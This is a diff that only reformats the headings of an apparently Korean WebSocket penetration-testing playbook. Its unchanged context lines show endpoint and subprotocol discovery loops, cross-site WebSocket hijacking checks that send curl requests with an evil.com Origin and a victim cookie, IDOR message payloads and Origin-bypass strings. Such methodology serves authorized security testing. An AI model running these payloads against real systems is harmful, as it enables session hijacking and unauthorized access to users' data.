@@ -1,6 +1,6 @@
 ### 정찰 페이로드
 
-**WebSocket endpoint 발견:**
+#### WebSocket endpoint 발견
 ```bash
 # 일반적인 경로 후보
 for path in "/ws" "/socket" "/websocket" "/ws/v1" "/api/ws" "/socket.io" "/cable" "/stream" "/realtime"; do
@@ -22,12 +22,12 @@ curl "https://target/signalr/negotiate"
 curl "https://target/hub/negotiate"
 ```
 
-**클라이언트 코드에서 WebSocket URL 추출:**
+#### 클라이언트 코드에서 WebSocket URL 추출
 - HTML 응답에 `new WebSocket('wss://...')` 패턴 grep
 - bundle.js 안 `io('wss://...')` 패턴
 - Source map에서 (sourcemap-scanner 결합)
 
-**Subprotocol enumeration:**
+#### Subprotocol enumeration
 ```bash
 # 어떤 subprotocol 지원하는지
 for proto in "graphql-ws" "graphql-transport-ws" "stomp" "amqp" "mqtt"; do
@@ -64,7 +64,7 @@ curl -i -N \
 # 101 Switching Protocols → CSWSH 확인
 ```
 
-**Socket.IO polling fallback:**
+#### Socket.IO polling fallback
 ```bash
 curl "https://target/socket.io/?EIO=4&transport=polling" \
   -H "Origin: https://evil.com" -H "Cookie: session=VICTIM"
@@ -78,7 +78,7 @@ curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
   "https://target/ws"
 ```
 
-**메시지 인젝션 (wscat/websocat):**
+#### 메시지 인젝션 (wscat/websocat)
 ```bash
 wscat -c "wss://target/ws" -H "Cookie: session=USER"
 ```
@@ -88,25 +88,25 @@ wscat -c "wss://target/ws" -H "Cookie: session=USER"
 - `{"type":"subscribe","channel":"/user/OTHER_ID/notifications"}` (CHANNEL_IDOR)
 - `{"type":"send","to":"victim","message":"x"}` (인가 없는 메시지 발송)
 
-**Subprotocol 변조:**
+#### Subprotocol 변조
 ```bash
 curl -H "Sec-WebSocket-Protocol: admin-protocol, default" ...
 # Sec-WebSocket-Protocol에 admin 권한 protocol 시도
 ```
 
-**JWT 만료 후 connection 유지:**
+#### JWT 만료 후 connection 유지
 ```bash
 # 1. 짧은 TTL JWT로 연결
 wscat -c "wss://target/ws?token=SHORT_TTL_JWT"
 # 2. TTL 초과 후 메시지 송신 — 거부되지 않으면 LATE_AUTH
 ```
 
-**Origin 변형:**
+#### Origin 변형
 - `Origin: null` (sandbox iframe)
 - `Origin: https://target.evil.com` (substring match 우회)
 - `Origin: https://evil.com#https://target.com` (fragment trick)
 
-**SignalR fallback (long polling/SSE):**
+#### SignalR fallback (long polling/SSE)
 ```bash
 # WebSocket 차단 시 fallback
 curl "https://target/signalr/connect?transport=longPolling&clientProtocol=2.0" \
@@ -127,7 +127,7 @@ curl "https://target/signalr/connect?transport=longPolling&clientProtocol=2.0" \
 | Cookie 인증 차단 (Bearer만) | WebSocket은 query string으로 token 전달 — `wss://target/ws?token=X` 노출 |
 | HTTPS 강제 | 일부 환경 ws:// fallback 잔존 |
 
-**Compression attack (CRIME 변형):**
+#### Compression attack (CRIME 변형)
 - permessage-deflate 활성 + 피해자 데이터 예측 공격 (드물지만 가능)
 
 ---
